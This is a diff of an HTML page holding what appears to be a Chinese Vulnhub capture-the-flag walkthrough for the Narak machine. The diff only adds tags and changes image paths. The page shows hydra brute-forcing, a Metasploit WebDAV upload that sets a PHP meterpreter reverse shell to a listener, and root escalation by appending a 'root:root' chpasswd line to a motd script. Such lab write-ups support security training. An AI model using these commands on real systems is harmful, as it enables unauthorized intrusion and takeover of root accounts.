@@ -54,6 +54,8 @@ hydra -L wordlist.txt -P wordli,">
         <div class="stuff">
             <span>五月 29, 2023</span>
             
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a></li></ul>
+
 
         </div>
         <div class="content markdown">
@@ -64,7 +66,7 @@ hydra -L wordlist.txt -P wordlist.txt -f -V 192.168.246.140 http-get /webdav</co
 <p>cewl生成字典用hydra爆破，得到用户密码yamdoot:Swarg</p>
 <h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>webdav存在不安全的put方法</p>
 <ol>
-<li><h4 id="采用cadaver上传webshell"><a href="#采用cadaver上传webshell" class="headerlink" title="采用cadaver上传webshell"></a>采用cadaver上传webshell</h4><p><img src="/2023/05/29/vulnhub/vulnhub-ha-narak/vulnhub-ha-narak/image-20230530155610987.png" alt="image-20230530155610987"></p>
+<li><h4 id="采用cadaver上传webshell"><a href="#采用cadaver上传webshell" class="headerlink" title="采用cadaver上传webshell"></a>采用cadaver上传webshell</h4><p><img src="/2023/05/29/vulnhub/vulnhub-narak/vulnhub-narak/image-20230530155610987.png" alt="image-20230530155610987"></p>
 </li>
 <li><h4 id="msf中的webdav模块"><a href="#msf中的webdav模块" class="headerlink" title="msf中的webdav模块"></a>msf中的webdav模块</h4><pre><code>use exploit/windows/http/xampp_webdav_upload_php
 set payload php/meterpreter/reverse_tcp
@@ -73,22 +75,22 @@ set USERNAME yamdoot
 set PASSWORD Swarg
 set LHOST 192.168.9.128</code></pre>
 <p>运行php成功反弹</p>
-<p><img src="/2023/05/29/vulnhub/vulnhub-ha-narak/vulnhub-ha-narak/image-20230530160532846.png" alt="image-20230530160532846"></p>
+<p><img src="/2023/05/29/vulnhub/vulnhub-narak/vulnhub-narak/image-20230530160532846.png" alt="image-20230530160532846"></p>
 </li>
 </ol>
 <p>发现/home下的三个用户</p>
 <pre><code>inferno narak yamdoot</code></pre>
 <p>对brainfuck解密得到inferno的密码chitragupt，ssh成功登录</p>
-<p><img src="/2023/05/29/vulnhub/vulnhub-ha-narak/vulnhub-ha-narak/image-20230530160807309.png" alt="image-20230530160807309"></p>
+<p><img src="/2023/05/29/vulnhub/vulnhub-narak/vulnhub-narak/image-20230530160807309.png" alt="image-20230530160807309"></p>
 <h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><h4 id="1-使用motd提权"><a href="#1-使用motd提权" class="headerlink" title="1.使用motd提权"></a>1.使用motd提权</h4><p>（用户登录系统时弹出的欢迎信息，默认是放在/etc/update-motd.d/的shell脚本。这些脚本文件就是当用户登录时就能以root用户身份执行一段代码。故尝试修改其中某个脚本，当每次登录系统就把root用户密码修改为一个已知的密码）</p>
 <pre><code>find / -type f -user root -perm -ug=x,o=w -exec ls -l '{}' \; 2&gt;/dev/null</code></pre>
-<p><img src="/2023/05/29/vulnhub/vulnhub-ha-narak/vulnhub-ha-narak/image-20230530161102504.png" alt="image-20230530161102504"></p>
+<p><img src="/2023/05/29/vulnhub/vulnhub-narak/vulnhub-narak/image-20230530161102504.png" alt="image-20230530161102504"></p>
 <p>或者采用辅助脚本<a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng/tree/master">linpeas.sh</a></p>
-<p><img src="/2023/05/29/vulnhub/vulnhub-ha-narak/vulnhub-ha-narak/image-20230530161843985.png" alt="image-20230530161843985"></p>
-<p><img src="/2023/05/29/vulnhub/vulnhub-ha-narak/vulnhub-ha-narak/image-20230530161805010.png" alt="image-20230530161805010"></p>
+<p><img src="/2023/05/29/vulnhub/vulnhub-narak/vulnhub-narak/image-20230530161843985.png" alt="image-20230530161843985"></p>
+<p><img src="/2023/05/29/vulnhub/vulnhub-narak/vulnhub-narak/image-20230530161805010.png" alt="image-20230530161805010"></p>
 <pre><code>echo "echo 'root:root'| chpasswd"&gt;&gt;00-header</code></pre>
 <p>重新登陆并提权获取flag</p>
-<p><img src="/2023/05/29/vulnhub/vulnhub-ha-narak/vulnhub-ha-narak/image-20230530161408727.png" alt="image-20230530161408727"></p>
+<p><img src="/2023/05/29/vulnhub/vulnhub-narak/vulnhub-narak/image-20230530161408727.png" alt="image-20230530161408727"></p>
 <h4 id="2-CVE-2021-3493"><a href="#2-CVE-2021-3493" class="headerlink" title="2.CVE-2021-3493"></a>2.CVE-2021-3493</h4><p>不赘述</p>
 
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
